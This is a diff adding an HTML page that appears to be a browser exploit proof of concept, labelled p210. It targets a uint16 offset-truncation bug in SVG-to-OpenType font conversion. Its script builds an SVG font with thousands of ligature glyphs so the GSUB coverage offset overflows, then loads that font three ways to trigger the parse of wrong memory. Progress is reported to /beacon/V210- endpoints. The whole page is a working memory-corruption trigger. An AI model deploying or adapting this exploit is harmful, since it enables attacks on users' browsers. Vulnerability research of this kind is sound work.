@@ -1,0 +1,151 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>p210</title></head>
+<body>
+<script>
+// p210 — SVG font Placeholder::populate() uint16 truncation
+//
+// Bug: SVGToOTFFontConversion.cpp line 114-119
+// Placeholder::populate() computes delta = m_result.size() - m_baseOfOffset
+// ASSERT(delta < uint16_max) stripped in release
+// overwrite16(m_location, delta) silently truncates delta to uint16_t
+//
+// Target: GSUB ligature table — coverage table offset placeholder (line 770)
+// populated at line 798 after all LigatureSet+Ligature data written.
+// With ~3000 multi-char ligatures, data between placeholder and populate > 64KB.
+// Truncated offset makes FreeType parse wrong memory as coverage table.
+//
+// Beacon prefix: V210-
+
+(function() {
+  function B(tag, body) {
+    try {
+      var url = '/beacon/V210-' + tag + '?t=' + Date.now();
+      if (body) { navigator.sendBeacon(url, body); }
+      else { new Image().src = url; }
+    } catch(e) {}
+  }
+
+  B('BOOT');
+
+  // Build SVG font with many ligature glyphs to overflow GSUB delta
+  var NUM_LIG = 3200; // Each writes ~22 bytes => ~70KB > 65535
+  var svgParts = [];
+  svgParts.push('<svg xmlns="http://www.w3.org/2000/svg">');
+  svgParts.push('<defs>');
+  svgParts.push('<font id="TestFont">');
+  svgParts.push('<font-face font-family="V210Test" units-per-em="1000" ascent="800" descent="-200"/>');
+  svgParts.push('<missing-glyph horiz-adv-x="500" d="M0 0h500v800h-500z"/>');
+
+  // Base glyphs for ligature components (a-z, A-Z, 0-9)
+  var baseChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  for (var i = 0; i < baseChars.length; i++) {
+    var c = baseChars.charCodeAt(i);
+    svgParts.push('<glyph unicode="&#' + c + ';" horiz-adv-x="500" d="M100 0h300v600h-300z"/>');
+  }
+  B('BASE-GLYPHS-' + baseChars.length);
+
+  // Generate ligature glyphs — each with a 8-char unicode sequence
+  // This creates many LigatureSet entries, inflating the GSUB table
+  for (var i = 0; i < NUM_LIG; i++) {
+    // Create a unique 8-char ligature string from base chars
+    var lig = '';
+    var idx = i;
+    for (var j = 0; j < 8; j++) {
+      lig += baseChars[idx % baseChars.length];
+      idx = Math.floor(idx / baseChars.length) + j + 1;
+    }
+    // Ligature glyph with unique path
+    var x = (i % 50) * 10;
+    svgParts.push('<glyph unicode="' + lig + '" horiz-adv-x="500" d="M' + x + ' 0h300v600h-300z"/>');
+  }
+  B('LIG-GLYPHS-' + NUM_LIG);
+
+  svgParts.push('</font>');
+  svgParts.push('</defs>');
+  svgParts.push('</svg>');
+
+  var svgText = svgParts.join('\n');
+  B('SVG-SIZE-' + svgText.length);
+
+  // Method 1: Embed via @font-face with data URI
+  try {
+    var blob = new Blob([svgText], {type: 'image/svg+xml'});
+    var url = URL.createObjectURL(blob);
+    B('BLOB-URL-OK');
+
+    var style = document.createElement('style');
+    style.textContent = '@font-face { font-family: "V210Test"; src: url("' + url + '") format("svg"); }';
+    document.head.appendChild(style);
+    B('STYLE-ADDED');
+
+    // Trigger font load by using it
+    var div = document.createElement('div');
+    div.style.cssText = 'font-family: "V210Test"; font-size: 24px; position: absolute; left: -9999px;';
+    // Use text that triggers ligature lookup
+    div.textContent = 'abcdefgh ijklmnop qrstuvwx';
+    document.body.appendChild(div);
+    B('DIV-ADDED');
+
+    // Also try FontFace API
+    setTimeout(function() {
+      try {
+        var ff = new FontFace('V210Test2', 'url(' + url + ')');
+        ff.load().then(function() {
+          B('FONTFACE-LOADED');
+          document.fonts.add(ff);
+          // If we get here, the SVG font was processed!
+          // The truncated GSUB offset means FreeType reads from wrong position
+          B('FONT-ACTIVE');
+        }).catch(function(e) {
+          B('FONTFACE-ERR-' + e.message.substring(0, 50));
+        });
+      } catch(e) {
+        B('FONTFACE-API-ERR-' + e.message.substring(0, 50));
+      }
+    }, 500);
+
+  } catch(e) {
+    B('METHOD1-ERR-' + e.message.substring(0, 50));
+  }
+
+  // Method 2: Inline SVG in document
+  setTimeout(function() {
+    try {
+      var container = document.createElement('div');
+      container.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden';
+      container.innerHTML = svgText;
+      document.body.appendChild(container);
+      B('INLINE-SVG-ADDED');
+
+      // Use the font via CSS
+      var testDiv = document.createElement('div');
+      testDiv.style.cssText = 'font-family: "V210Test"; font-size: 48px;';
+      testDiv.textContent = 'abcdefghijklmnopqrstuvwxyz';
+      container.appendChild(testDiv);
+      B('INLINE-TEST-ADDED');
+    } catch(e) {
+      B('METHOD2-ERR-' + e.message.substring(0, 50));
+    }
+  }, 2000);
+
+  // Method 3: Object/embed for SVG font
+  setTimeout(function() {
+    try {
+      var blob2 = new Blob([svgText], {type: 'image/svg+xml'});
+      var url2 = URL.createObjectURL(blob2);
+      var obj = document.createElement('object');
+      obj.type = 'image/svg+xml';
+      obj.data = url2;
+      obj.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px';
+      document.body.appendChild(obj);
+      B('OBJECT-ADDED');
+    } catch(e) {
+      B('METHOD3-ERR-' + e.message.substring(0, 50));
+    }
+
+    setTimeout(function() { B('DONE'); }, 2000);
+  }, 4000);
+})();
+</script>
+</body>
+</html>
